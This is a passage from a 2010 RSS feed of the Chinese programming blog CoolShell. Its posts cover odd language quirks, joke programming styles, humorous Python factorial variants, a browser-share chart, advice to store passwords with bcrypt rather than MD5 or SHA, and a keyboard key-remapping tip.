$$<br>
$[<br>
@_[/perl]</p>
<p>其所有的这些怪异的变量请参看：<a href="http://www.kichwa.com/quik_ref/spec_variables.html">http://www.kichwa.com/quik_ref/spec_variables.html</a> </p>
<p><strong>6、Java的异常返回</strong></p>
<p>请看下面这段程序，你觉得其返回true还是false？</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">try {
    return true;
} finally {
    return false;
}</pre>
<p>在 javascript 和python下，其行为和Java的是一样的。 </p>
<p><strong>7、C语言中的Duff device</strong></p>
<p>下面的这段程序你能看得懂吗？这就是所谓的Duff Device，相当的怪异。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void duff_memcpy( char* to, char* from, size_t count ) {
    size_t n = (count+7)/8;
    switch( count%8 ) {
    case 0: do{ *to++ = *from++;
    case 7:     *to++ = *from++;
    case 6:     *to++ = *from++;
    case 5:     *to++ = *from++;
    case 4:     *to++ = *from++;
    case 3:     *to++ = *from++;
    case 2:     *to++ = *from++;
    case 1:     *to++ = *from++;
            }while(--n&gt;0);
    }
} </pre>
<p><strong>8、PHP中的字符串当函数用</strong></p>
<p>PHP中的某些用法也是很怪异的</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$x = "foo";
function foo(){ echo "wtf"; }
$x();</pre>
<p><strong>9、在C++中，你可以使用空指针调用静态函数</strong></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">class Foo {
  public:
    static void bar() {
      std::cout &lt;&lt; "bar()" &lt;&lt; std::endl;
    }
};
 
int main(void) {
  Foo * foo = NULL;
  foo-&gt;bar(); //=&gt; WTF!?
  return 0; // Ok!
}</pre>
<p>呵呵。的确是挺怪异的。</p>
 ]]></content>
<pubDate>2010-01-21T08:16:18+08:00</pubDate>
<guid>https://coolshell.cn/articles/2053.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 各种流行的编程风格 ]]></title>
<link>https://coolshell.cn/articles/2058.html</link>
<content><![CDATA[ 
<p>在过去的N年中，我遇到了很多使用囧然不同风格的开发者，下面是我所知道的一些，你还知道其它的吗？</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%95%A3%E5%BC%B9%E6%9E%AA%E7%BC%96%E7%A8%8B" title="散弹枪编程">散弹枪编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%92%9E%E5%A4%A7%E8%BF%90%E7%BC%96%E7%A8%8B" title="撞大运编程">撞大运编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Cargo-Cult_%E7%BC%96%E7%A8%8B" title=" 
Cargo-Cult 编程">
Cargo-Cult 编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%88%BB%E8%88%9F%E6%B1%82%E5%89%91%E7%BC%96%E7%A8%8B" title="刻舟求剑编程">刻舟求剑编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%A9%B1%E5%8A%A8%E5%9E%8B%E7%BC%96%E7%A8%8B" title="设计模式驱动型编程">设计模式驱动型编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E4%BE%A6%E6%8E%A2%E5%9E%8B%E7%BC%96%E7%A8%8B" title="侦探型编程">侦探型编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%B1%A0%E5%AE%B0%E5%BC%8F%E7%BC%96%E7%A8%8B" title="屠宰式编程">屠宰式编程</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%95%A3%E5%BC%B9%E6%9E%AA%E7%BC%96%E7%A8%8B"></span>散弹枪编程<span class="ez-toc-section-end"></span>
</h4>
<p>这种编程风格是一种开发者使用非常随意的方式对待代码。“嗯，这个方法调用出错了……那么我会试着把传出的参数从 <strong>false</strong> 变成 <strong>true</strong>!”，当然依然出错，于是我们的程序员会这样：“好吧，那我就注释掉整个方法吧”，或是其它更为随意的处理方式，直到最后让这个调用成功。或是被旁边的某个程序员指出一个正确的方法。</p>
<p>如果我们把一个正规的程序员和一个撞大运的程序员放在一起做结地，那么，那个正规的程序可以马上变得发疯起来，并且，可以把正规的程序员的智商降到最低。两个撞大运的程序员不应该在一起做结对编程，这是因为他们破坏性的才能会造成的伤害会比只有一个还差。</p>
<h4>
<span class="ez-toc-section" id="%E6%92%9E%E5%A4%A7%E8%BF%90%E7%BC%96%E7%A8%8B"></span>撞大运编程<span class="ez-toc-section-end"></span>
</h4>
<p>这是一种比散弹枪编程要温和一些的编程方式，我相信这种方式可能会是大多数程序员都会使用的方式。这种编程方式经常出现于程序员并不确切知道他们在干什么，也不知道所写的程序的本质和实际，但是可以让程序工作起来。他们以一种撞大运的方式在写程序，某些时候，他们根本就不知道某个错误的原因，就开始稀里糊涂地修改代码。一旦出现问题，他们会用两条路：1）停下来，理解一下程序，找到出错的原因。2）使用散弹枪编程方式开始解决问题。</p>
<p>测试驱动开发（Test Driven Development）是一种可以用来拯救上百万的撞大运编程的程序员。于是，他们有了一个更为NB的借口：只要我的程序通过测试了，你还有什么话好说？别骂我，测试驱动开发是一个不错的事物，其主要是用来控制撞大运开发所带来的问题。</p>
<h4>
<span id="more-2058"></span><br>
Cargo-Cult 编程</h4>
<p>关于Cargo Cults 这个词儿来自二战期间的某些太平洋上小岛里的土著人。在战争期间，美国利用这些小岛作为太平洋战场上的补给站。他们在这些小岛上修建自己的飞机跑道以用来运输战争物资。而那些小岛上的土著人从来没有见过飞机，当他们看到飞机的时候，觉得相当的牛，可以为那些白人带来各种各样的物品和食物。当二战结束后，那些土著人仿照着修建了飞机跑道，并用竹子修建了塔台。然后就在那期望着有飞机为他们送来物品和食物。</p>
<p>Cargo Cult 编程是一种非常流行的编程方法，使用这种方法的程序员会学习其它编程高手的编程方法，虽然他们并不知道为什么高手们要那样做，但是他们觉得那样做可以让程序工作起来。举个例子，当时有大量的程序员在J2EE出现的第一年中过度地使用了EJBs和Entity Beans。</p>
<h4>
<span class="ez-toc-section" id="%E5%88%BB%E8%88%9F%E6%B1%82%E5%89%91%E7%BC%96%E7%A8%8B"></span>刻舟求剑编程<span class="ez-toc-section-end"></span>
</h4>
<p>刻舟求剑是一个很流行的寓言了。这种风格的编程在程序员的圈子里是非常常见的。比如，有一天，你发现了一个空指会的异常，于是你到了产生空指针异常的地方，简单地放上一个判断： <code>if (p != NULL)。</code></p>
<p>是的，这样的fix可以让你的程序工作起来，但你并没有真正地解决问题。你只不过是在你的船边记下了剑掉下去的位置，这样做只不过把问题隐藏起来，最终只会让你的程序的行为变得神出鬼没。你应该找到为什么指针会为空的原因，然后再解决这个问题。</p>
<h4>
<span class="ez-toc-section" id="%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%A9%B1%E5%8A%A8%E5%9E%8B%E7%BC%96%E7%A8%8B"></span>设计模式驱动型编程<span class="ez-toc-section-end"></span>
</h4>
<p>正如这种编程的名字所说的，这种编程风格使用大量的设计模式，在你的程序中，四处都是设计模式，你的代码到处都是Facade，Observer ，Strategy，Adapter，等等等等。于是，你的程序要处理的业务逻辑被这些设计模式打乱得无法阅读，最后，也不知道是业务需求重来，还是设计模式重要，总之，实际业务需求的程序逻辑被各种设计模式混乱得不堪入目。</p>
<h4>
<span class="ez-toc-section" id="%E4%BE%A6%E6%8E%A2%E5%9E%8B%E7%BC%96%E7%A8%8B"></span>侦探型编程<span class="ez-toc-section-end"></span>
</h4>
<p>在解决一个Bug的时候，侦探型程序员会调查这个Bug的原因。然后，则调查引发这个BUG的原因的原因。再然后，其会分析修正代码后是否会导致其它代码失败的因果关系。再然后然后，他会使用文本搜索查找所有使用这个改动的代码，并继续查找更上一级的调用代码。最后，这个程序员会写下30个不同的情形的测试案例，就算这些测试案例和那个Bug没有什么关系，最最后，这个程序员有了足够多的信心，并且精确地修正了一个拼写错误。</p>
<p>与此同时，其它一个正常的程序修正了其它5个Bug。</p>
<h4>
<span class="ez-toc-section" id="%E5%B1%A0%E5%AE%B0%E5%BC%8F%E7%BC%96%E7%A8%8B"></span>屠宰式编程<span class="ez-toc-section-end"></span>
</h4>
<p>使用这种风格的程序员，对重构代码有着一种难以控制的极端冲动。他们几乎会重构所有经手的代码。就算是在产品在Release的前夜，当他在修正几个拼写错误的bug同时，其会修改10个类，以及重构与这10个类有联系的另20个类，并且修改了代码的build脚本，以及5个部署描述符。</p>
<p>文章：<a href="http://www.codeinstructions.com/2008/10/styles-of-programming.html" target="_blank">来源</a><br>
（全文完）</p>
 ]]></content>
<pubDate>2010-01-22T08:39:24+08:00</pubDate>
<guid>https://coolshell.cn/articles/2058.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个Windows 3.1的Web网站 ]]></title>
<link>https://coolshell.cn/articles/2065.html</link>
<content><![CDATA[ 
<p>啥也不说了，请大家围观下面这个网站吧。</p>
<p style="text-align: center;"><a href="http://www.michaelv.org/" target="_blank"><strong>http://www.michaelv.org/</strong></a></p>
<p style="text-align: left;">打开这个网站，你会看到N年前DOS时代的Windows 3.1的界面，居然还可以扫雷，呵呵。真应了那句话——“只要是可以被Javascript实现的应用或程序，最终都会被Javascript所实现”。另，关于其它Web上更为疯狂的程序，可以查看本站的<a href="https://coolshell.cn/articles/1932.html" target="_blank">这篇文章</a>。还有这个<a href="https://coolshell.cn/articles/1883.html" target="_blank">在线的IDE</a>。下面是win3.1的截图：</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2010/01/Win32web.jpg"><img alt="image placeholder" ></a> </p>
<p></p>
 ]]></content>
<pubDate>2010-01-25T13:50:02+08:00</pubDate>
<guid>https://coolshell.cn/articles/2065.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个浏览器市场占有量的图 ]]></title>
<link>https://coolshell.cn/articles/2069.html</link>
<content><![CDATA[ 
<p>下面这个网站是一个关于Web浏览器的市场占有量的图：</p>
<p style="text-align: center;"><a href="http://www.michaelvandaniker.com/labs/browserVisualization/" target="_blank">http://www.michaelvandaniker.com/labs/browserVisualization/</a></p>
<p style="text-align: left;">这个图是从2002年到2009年，也许未来还会更新，把鼠标移到每个弧上你可以看到那个浏览器的的占有量的百分比。如下图：</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2010/01/browser_history.jpg"><img alt="image placeholder" ></a> </p>
<p>这个图本来没有什么，但制作者把其做成了一个圆弧形，这样，看下来就有些不一样了。你还没有看出来？让我们来对比一下这个图和FireFox的logo吧。</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2010/01/firefoxlogo.jpg"><img alt="image placeholder" ></a></p>
<p></p>
 ]]></content>
<pubDate>2010-01-25T14:24:18+08:00</pubDate>
<guid>https://coolshell.cn/articles/2069.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何防范密码被破解 ]]></title>
<link>https://coolshell.cn/articles/2078.html</link>
<content><![CDATA[ 
<p>你会用什么样的算法来为你的用户保存密码？如果你还在用明码的话，那么一旦你的网站被hack了，那么你所有的用户口令都会被泄露了，这意味着，你的系统或是网站就此完蛋了。所以，我们需要通过一些不可逆的算法来保存用户的密码。比如：MD5, SHA1, SHA256, SHA512, SHA-3,等Hash算法。这些算法都是不可逆的。系统在验证用户的口令时，需要把Hash加密过后的口令与后面存放口令的数据库中的口令做比较，如果一致才算验证通过。</p>
<p>但你觉得这些算法好吗？我说的是：MD5, SHA1, SHA256, SHA512, SHA-3。如果你使用的是MD5算法来加密你的口令，如果你的口令长度只有小写字母再加上数字，假设口令的长度是6位，那么在目前一台比较新一点的PC机上，穷举所有的口令只需要40秒钟。而据我们了解，几乎有90%以上的用户只用小写字母和数字来组织其口令。对于6位长度的密码只需要最多40秒就可以破解了，这可能会吓到你。</p>
<p>如果你愿意花2000美金和一周的时间来构建一个<a href="https://www.nvidia.com/object/cuda_home.html" target="_blank">CUDA</a>，那么，你可以在你组建的这个集群中使用进行密码穷举运算，其速度是，<a href="http://www.win.tue.nl/cccc/sha-1-challenge.html" target="_blank">1秒钟可以计算7亿个口令</a>。对于目前实际当中使用的比较复杂的口令，其破解率也可以高达每秒一个。当然，这里说的算法是MD5，SHA之类的算法。</p>
<p>那么，对于这样的一种情况来说，我们怎么办？我们还是有办法的。</p>
<p><span id="more-2078"></span></p>
<p>我们知道MD5，SHA的算法速度太快了。所以，我们需要一个“慢一点”的加密算法。呵呵。bcrypt是这样的一个算法，因为它很慢，对于计算机来说，其慢得有点BT了，但却慢得刚刚好！对于验证用户口令来说是不慢的，对于穷举用户口令来说，其会让那些计算机变得如同蜗牛一样。</p>
<p>因为bcrypt采用了一系列各种不同的Blowfish加密算法，并引入了一个work factor，这个工作因子可以让你决定这个算法的代价有多大。因为这些，这个算法不会因为计算机CPU处理速度变快了，而导致算法的时间会缩短了。因为，你可以增加work factor来把其性能降下来。呵呵。</p>
<p>那么，bcrypt到底有多慢？如果和MD5一起来比较的话，如果使用值为12的work factor的话，如果加密“cool”的话，bcrypt需要0.3秒，而MD5只需要一微秒（百万分之一秒）。也就是说，前面我们说的那个只需要40秒就可以穷举完所有的可能的MD5编码的口令的算法，在使用bcrypt下，需要12年。</p>
<p>这就是bcrypt给你带来的选择，<strong>你可以一个安全的口令和一个快速的加密算法，或是一个不怎么安全的口令和一个性能不好的加密算法</strong>。</p>
 ]]></content>
<pubDate>2010-02-01T17:18:36+08:00</pubDate>
<guid>https://coolshell.cn/articles/2078.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Python程序员的进化 ]]></title>
<link>https://coolshell.cn/articles/2082.html</link>
<content><![CDATA[ 
<p>以前本站发布过一篇《<a href="https://coolshell.cn/articles/172.html" target="_blank">程序员的进化</a>》，以一种幽默的代码展现方式调侃了程序。下面这篇是关于Python程序员的。以阶乘为例，很有意思。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%96%B0%E6%89%8B%E7%A8%8B%E5%BA%8F%E5%91%98" title="新手程序员">新手程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%AC%AC%E4%B8%80%E5%B9%B4%E7%9A%84%E5%88%9A%E5%AD%A6%E5%AE%8CPascal%E7%9A%84%E6%96%B0%E6%89%8B" title="
第一年的刚学完Pascal的新手">
第一年的刚学完Pascal的新手</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%AC%AC%E4%B8%80%E5%B9%B4%E7%9A%84%E5%88%9A%E5%AD%A6%E5%AE%8CC%E8%AF%AD%E8%A8%80%E7%9A%84%E6%96%B0%E6%89%8B" title="
第一年的刚学完C语言的新手">
第一年的刚学完C语言的新手</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%AC%AC%E4%B8%80%E5%B9%B4%E5%88%9A%E5%AD%A6%E5%AE%8CSICP%E7%9A%84%E6%96%B0%E6%89%8B" title="
第一年刚学完SICP的新手">
第一年刚学完SICP的新手</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%AC%AC%E4%B8%80%E5%B9%B4%E5%88%9A%E5%AD%A6%E5%AE%8CPython%E7%9A%84%E6%96%B0%E6%89%8B" title="
第一年刚学完Python的新手">
第一年刚学完Python的新手</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E7%88%B1%E5%81%B7%E6%87%92%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98" title="
爱偷懒的程序员">
爱偷懒的程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%9B%B4%E6%87%92%E7%9A%84_Python_%E7%A8%8B%E5%BA%8F%E5%91%98" title="
更懒的 Python 程序员">
更懒的 Python 程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Python_%E4%B8%93%E5%AE%B6" title="
Python 专家">
Python 专家</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#Python_%E9%BB%91%E5%AE%A2" title="Python 黑客">Python 黑客</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E4%B8%93%E5%AE%B6%E7%BA%A7%E7%A8%8B%E5%BA%8F%E5%91%98" title="
专家级程序员">
专家级程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E8%8B%B1%E8%AF%AD%E7%B3%BB%E7%9A%84%E4%B8%93%E5%AE%B6%E7%BA%A7%E7%A8%8B%E5%BA%8F%E5%91%98" title="
英语系的专家级程序员">
英语系的专家级程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#Web_%E8%AE%BE%E8%AE%A1%E8%80%85" title="
Web 设计者">
Web 设计者</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#Unix_%E7%A8%8B%E5%BA%8F%E5%91%98" title="
Unix 程序员">
Unix 程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#Windows_%E7%A8%8B%E5%BA%8F%E5%91%98" title="
Windows 程序员">
Windows 程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#%E5%85%AC%E5%8F%B8%E9%87%8C%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98" title="
公司里的程序员">
公司里的程序员</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%96%B0%E6%89%8B%E7%A8%8B%E5%BA%8F%E5%91%98"></span>新手程序员<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">def factorial(x):
    if x == 0:
        return 1
    else:
        return x * factorial(x - 1)
print factorial(6)</pre>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E5%B9%B4%E7%9A%84%E5%88%9A%E5%AD%A6%E5%AE%8CPascal%E7%9A%84%E6%96%B0%E6%89%8B"></span>
第一年的刚学完Pascal的新手<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">def factorial(x):
    result = 1
    i = 2
    while i &lt;= x:
        result = result * i
        i = i + 1
    return result
print factorial(6)</pre>
<h4><span id="more-2082"></span></h4>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E5%B9%B4%E7%9A%84%E5%88%9A%E5%AD%A6%E5%AE%8CC%E8%AF%AD%E8%A8%80%E7%9A%84%E6%96%B0%E6%89%8B"></span>
第一年的刚学完C语言的新手<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">def fact(x): #{
    result = i = 1;
    while (i &lt;= x): #{
        result *= i;
        i += 1;
    #}
    return result;
#}
print(fact(6))</pre>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E5%B9%B4%E5%88%9A%E5%AD%A6%E5%AE%8CSICP%E7%9A%84%E6%96%B0%E6%89%8B"></span>
第一年刚学完SICP的新手<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">@tailcall
def fact(x, acc=1):
    if (x &gt; 1): return (fact((x - 1), (acc * x)))
    else:       return acc
print(fact(6))</pre>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E5%B9%B4%E5%88%9A%E5%AD%A6%E5%AE%8CPython%E7%9A%84%E6%96%B0%E6%89%8B"></span>
第一年刚学完Python的新手<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">def Factorial(x):
    res = 1
    for i in xrange(2, x + 1):
        res *= i
    return res
print Factorial(6)</pre>
<h4>
<span class="ez-toc-section" id="%E7%88%B1%E5%81%B7%E6%87%92%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98"></span>
爱偷懒的程序员<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">def fact(x):
    return x &gt; 1 and x * fact(x - 1) or 1
print fact(6)</pre>
<h4>
<span class="ez-toc-section" id="%E6%9B%B4%E6%87%92%E7%9A%84_Python_%E7%A8%8B%E5%BA%8F%E5%91%98"></span>
更懒的 Python 程序员<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">f = lambda x: x and x * f(x - 1) or 1
print f(6)</pre>
<h4>
<span class="ez-toc-section" id="Python_%E4%B8%93%E5%AE%B6"></span>
Python 专家<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">import operator as op
import functional as f
fact = lambda x: f.foldl(op.mul, 1, xrange(2, x + 1))
print fact(6)</pre>
<h4>
<span class="ez-toc-section" id="Python_%E9%BB%91%E5%AE%A2"></span>Python 黑客<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">import sys
@tailcall
def fact(x, acc=1):
    if x: return fact(x.__sub__(1), acc.__mul__(x))
    return acc
sys.stdout.write(str(fact(6)) + '\n')</pre>
<h4>
<span class="ez-toc-section" id="%E4%B8%93%E5%AE%B6%E7%BA%A7%E7%A8%8B%E5%BA%8F%E5%91%98"></span>
专家级程序员<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">import c_math
fact = c_math.fact
print fact(6)</pre>
<h4>
<span class="ez-toc-section" id="%E8%8B%B1%E8%AF%AD%E7%B3%BB%E7%9A%84%E4%B8%93%E5%AE%B6%E7%BA%A7%E7%A8%8B%E5%BA%8F%E5%91%98"></span>
英语系的专家级程序员<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">import c_maths
fact = c_maths.fact
print fact(6)</pre>
<h4>
<span class="ez-toc-section" id="Web_%E8%AE%BE%E8%AE%A1%E8%80%85"></span>
Web 设计者<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">def factorial(x):
    #-------------------------------------------------
    #--- Code snippet from The Math Vault          ---
    #--- Calculate factorial (C) Arthur Smith 1999 ---
    #-------------------------------------------------
    result = str(1)
    i = 1 #Thanks Adam
    while i &lt;= x:
        #result = result * i  #It's faster to use *=
        #result = str(result * result + i)
           #result = int(result *= i) #??????
        result str(int(result) * i)
        #result = int(str(result) * i)
        i = i + 1
    return result
print factorial(6)</pre>
<h4>
<span class="ez-toc-section" id="Unix_%E7%A8%8B%E5%BA%8F%E5%91%98"></span>
Unix 程序员<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">import os
def fact(x):
    os.system('factorial ' + str(x))
fact(6)</pre>
<h4>
<span class="ez-toc-section" id="Windows_%E7%A8%8B%E5%BA%8F%E5%91%98"></span>
Windows 程序员<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">NULL = None
def CalculateAndPrintFactorialEx(dwNumber,
                                 hOutputDevice,
                                 lpLparam,
                                 lpWparam,
                                 lpsscSecurity,
                                 *dwReserved):
    if lpsscSecurity != NULL:
        return NULL #Not implemented
    dwResult = dwCounter = 1
    while dwCounter &lt;= dwNumber:
        dwResult *= dwCounter
        dwCounter += 1
    hOutputDevice.write(str(dwResult))
    hOutputDevice.write('\n')
    return 1
import sys
CalculateAndPrintFactorialEx(6, sys.stdout, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL)</pre>
<h4>
<span class="ez-toc-section" id="%E5%85%AC%E5%8F%B8%E9%87%8C%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98"></span>
公司里的程序员<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">def new(cls, *args, **kwargs):
    return cls(*args, **kwargs)

class Number(object):
    pass

class IntegralNumber(int, Number):
    def toInt(self):
        return new (int, self)

class InternalBase(object):
    def __init__(self, base):
        self.base = base.toInt()

    def getBase(self):
        return new (IntegralNumber, self.base)

class MathematicsSystem(object):
    def __init__(self, ibase):
        Abstract

    @classmethod
    def getInstance(cls, ibase):
        try:
            cls.__instance
        except AttributeError:
            cls.__instance = new (cls, ibase)
        return cls.__instance

class StandardMathematicsSystem(MathematicsSystem):
    def __init__(self, ibase):
        if ibase.getBase() != new (IntegralNumber, 2):
            raise NotImplementedError
        self.base = ibase.getBase()

    def calculateFactorial(self, target):
        result = new (IntegralNumber, 1)
        i = new (IntegralNumber, 2)
        while i &lt;= target:
            result = result * i
            i = i + new (IntegralNumber, 1)
        return result

print StandardMathematicsSystem.getInstance(new (InternalBase, new (IntegralNumber, 2))).calculateFactorial(new (IntegralNumber, 6))</pre>
<p>摘自：<a href="https://gist.github.com/289467" target="_blank">来源</a></p>
 ]]></content>
<pubDate>2010-02-01T17:42:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/2082.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ iPad进化图 ]]></title>
<link>https://coolshell.cn/articles/2086.html</link>
<content><![CDATA[ 
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2010/02/ipad.jpg"><img alt="image placeholder" ></a></p>
<p></p>
 ]]></content>
<pubDate>2010-02-06T10:53:27+08:00</pubDate>
<guid>https://coolshell.cn/articles/2086.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 分享：我是如何使用Google Reader的 ]]></title>
<link>https://coolshell.cn/articles/2091.html</link>
<content><![CDATA[ 
<p>相信不少读者都是通过Google Reader (貌似没有中文名) 看到本文的，而多数Google Reader的爱好者都是贪婪的。如果你像我一样，估计未读数量从来都是1000+。遇到强迫症就麻烦了。下面一个方法能让阅读变得有“轻重缓急”。</p>
<ol>
<li>承认不是所有种子一样重要，有些更新你想立刻知道（例如某新闻类的博客：<a href="http://www.google.org.cn/">古奥</a>），有些只是希望不要错过（例如某经典博客：<a href="http://www.joelonsoftware.com/">Joe l on Software</a>），还有一些可能只是娱乐用的（例如：<a href="http://jandan.net/">煎蛋</a>）</li>
<li>Reader是可以为种子建文件夹的，所有“重要而必读”的种子都可以放在一个文件夹里，文件夹的名称最好是用“_” 开头，这样排序的时候可以在最前面（见图解）</li>
<li>每当打开Google Reader的时候，先看重要的种子即可，其他的有时间再读。</li>
</ol>
<p>笔者的Reader界面（献丑了）</p>
<p style="padding-left: 30px;">
</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/02/reader2.png"><img alt="image placeholder" ></a></p>
 ]]></content>
<pubDate>2010-02-07T09:35:01+08:00</pubDate>
<guid>https://coolshell.cn/articles/2091.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何修改微软人体工学键盘的Zoom键 ]]></title>
<link>https://coolshell.cn/articles/2097.html</link>
<content><![CDATA[ 
<p>如果你不是订阅本站的用户，你很肯能可能是通过搜索引擎的魔力来到本文的。</p>
<p>微软的软件产品咱们暂且不谈，他们生产的键盘鼠标确实很不错。例如，经典的 microsoft natural ergonomic keyboard 4000 （见图）。著名Google工程师博主Matt Cutts用的就是这个（<a href="http://www.mattcutts.com/blog/30-days-no-microsoft-software/">参考链接</a>）。</p>
<p>可是每个入手该键盘的geek都会觉得，这个弱智的设计师把zoom键放在中间干嘛，应该用来当上下滚轮嘛。</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/02/keyboard.jpg"><img alt="image placeholder" ></a></p>
<p>无独有偶，该问题已经被先辈们解决，笔者只搜到了<a href="http://paininthetech.com/2006/04/29/hack-the-microsoft-natural-4000-keyboard">英文文章</a></p>
<p>为了让中文读者方便找到并使用，暂且将关键步骤翻译如下：</p>
<ol>
<li>下载微软键盘驱动 <a href="https://www.microsoft.com/hardware/download/download.aspx?category=MK">http://www.microsoft.com/hardware/download/download.aspx?category=MK</a>
</li>
<li>找到command.xml文件，应该是在 C:\Program Files\Microsoft IntelliType Pro\</li>
